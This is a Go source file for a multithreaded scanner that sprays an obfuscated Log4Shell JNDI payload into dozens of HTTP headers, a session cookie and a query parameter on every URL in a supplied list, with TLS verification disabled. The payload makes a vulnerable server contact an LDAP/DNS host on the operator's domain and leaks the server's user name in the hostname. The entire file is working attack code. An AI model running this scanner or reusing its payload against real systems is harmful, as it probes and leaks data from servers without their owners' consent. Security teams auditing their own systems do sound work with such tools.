package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"

	log "github.com/sirupsen/logrus"
)

var (
	debug   = flag.Bool("debug", false, "Print debug output")
	threads = flag.Int("threads", 10, "Number of threads")
	urllist = flag.String("urllist", "", "file with URLs to scan")
	domain  = flag.String("domain", "", "domain to capture dns requests")
	timeout = flag.Duration("timeout", 2*time.Second, "timeout to target")
)

var (
	headerNames = []string{
		"Referer",
		"X-Api-Version",
		"Accept-Charset",
		"Accept-Datetime",
		"Accept-Encoding",
		"Accept-Language",
		"Forwarded",
		"Forwarded-For",
		"Forwarded-For-Ip",
		"Forwarded-Proto",
		"From",
		"TE",
		"True-Client-IP",
		"Upgrade",
		"User-Agent",
		"Via",
		"Warning",
		"X-Api-Version",
		"Max-Forwards",
		"Origin",
		"Pragma",
		"DNT",
		"Cache-Control",
		"X-Att-Deviceid",
		"X-ATT-DeviceId",
		"X-Correlation-ID",
		"X-Csrf-Token",
		"X-CSRFToken",
		"X-Do-Not-Track",
		"X-Foo",
		"X-Foo-Bar",
		"X-Forwarded",
		"X-Forwarded-By",
		"X-Forwarded-For",
		"X-Forwarded-For-Original",
		"X-Forwarded-Host",
		"X-Forwarded-Port",
		"X-Forwarded-Proto",
		"X-Forwarded-Protocol",
		"X-Forwarded-Scheme",
		"X-Forwarded-Server",
		"X-Forwarded-Ssl",
		"X-Forwarder-For",
		"X-Forward-For",
		"X-Forward-Proto",
		"X-Frame-Options",
		"X-From",
		"X-Geoip-Country",
		"X-Http-Destinationurl",
		"X-Http-Host-Override",
		"X-Http-Method",
		"X-Http-Method-Override",
		"X-HTTP-Method-Override",
		"X-Http-Path-Override",
		"X-Https",
		"X-Htx-Agent",
		"X-Hub-Signature",
		"X-If-Unmodified-Since",
		"X-Imbo-Test-Config",
		"X-Insight",
		"X-Ip",
		"X-Ip-Trail",
		"X-ProxyUser-Ip",
		"X-Requested-With",
		"X-Request-ID",
		"X-UIDH",
		"X-Wap-Profile",
		"X-XSRF-TOKEN",
	}
)

type app struct {
	client    *http.Client
	wg        *sync.WaitGroup
	inChan    <-chan string
	errorChan chan<- error
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randString(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	flag.Parse()

	log.SetOutput(os.Stdout)
	if *debug {
		log.SetLevel(log.DebugLevel)
	} else {
		log.SetLevel(log.InfoLevel)
	}

	if *urllist == "" {
		log.Fatal("please specify an urllist")
		return
	}

	if *domain == "" {
		log.Fatal("please specify a domain")
		return
	}

	inChan := make(chan string, *threads)
	errChan := make(chan error)

	wgMain := new(sync.WaitGroup)

	wgMain.Add(1)
	go func() {
		defer wgMain.Done()
		for err := range errChan {
			log.Error(err)
		}
	}()

	client := &http.Client{
		Timeout: *timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		}}

	app := app{
		client:    client,
		inChan:    inChan,
		errorChan: errChan,
		wg:        new(sync.WaitGroup),
	}
	for i := 0; i < *threads; i++ {
		app.wg.Add(1)
		go app.worker()
	}

	file, err := os.Open(*urllist)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	// optionally, resize scanner's capacity for lines over 64K, see next example
	for scanner.Scan() {
		inChan <- scanner.Text()
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	close(inChan)
	app.wg.Wait()
	close(errChan)
	// wait for error channel to finish
	wgMain.Wait()
}

func (a *app) worker() {
	defer a.wg.Done()
	ctx := context.Background()

	log.Debug("worker started")

	for x := range a.inChan {
		log.Debugf("Processing %s", x)
		u, err := url.Parse(x)
		if err != nil {
			a.errorChan <- err
			continue
		}
		host := fmt.Sprintf("%s.%s", u.Host, *domain)
		payload := fmt.Sprintf("${${::-j}${::-n}${::-d}${::-I}:ldap://${sys:user.name}.%s/%s}", host, randString(5))
		log.Debug(payload)
		if err := a.request(ctx, x, payload); err != nil {
			a.errorChan <- err
			continue
		}
	}

	log.Debug("worker done")
}

func (a *app) request(ctx context.Context, url, payload string) error {
	r, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return err
	}

	for _, h := range headerNames {
		r.Header.Set(h, payload)
	}

	r.AddCookie(&http.Cookie{
		Name:    "Session",
		Value:   payload,
		Path:    "/",
		Expires: time.Now().Add(8760 * time.Hour),
	})

	q := r.URL.Query()
	q.Add("DEBUG", "true")
	q.Add("Parameter", payload)
	r.URL.RawQuery = q.Encode()

	r.Header.Set("Accept", "*/*")

	resp, err := a.client.Do(r)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	_, err = io.Copy(io.Discard, resp.Body)
	if err != nil {
		return err
	}

	return nil
}
